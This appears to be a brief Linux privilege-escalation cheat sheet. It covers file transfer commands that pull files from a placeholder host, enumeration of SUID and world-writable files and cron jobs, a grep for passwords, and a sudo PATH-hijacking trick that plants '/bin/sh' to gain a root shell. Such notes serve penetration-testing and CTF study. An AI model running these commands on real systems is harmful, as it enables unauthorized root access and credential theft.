## File Transfers
```bash
# wget
wget http://<ip>/file_name -O /path/to/save/file

# Netcat
nc -nv <ip> <port> > file/to/recv

# cURL
curl http://<ip>/file_name --output file_name
```

## Information Gathering
```bash
# Find useable Linux files
find / -perm -u=s -type f 2>/dev/null

# Find writeable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Find writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Disk Usage
sudo du -hsx ./* | sort -rh | head -n 40

# Cron Jobs
ls -la /etc/cron.daily/

crontab -l

crontab -u root -l

systemctl list-timers

# Hunt passwords
grep password -B 5 -A 5 # below 5 above 5
```

## Abusing Sudo
Can sudo but absolute path is specified? Use `ltrace` to view libraries being loaded by these programs and check if absolute path is specified or not

```bash
# Easy win?
sudo -l # Check programs on GTFOBins

# Can sudo, abosulte path not specified?
echo "/bin/sh" > <program_name>
chmod 777 <program_name>
# Export PATH=.:$PATH
sudo <program_name>
```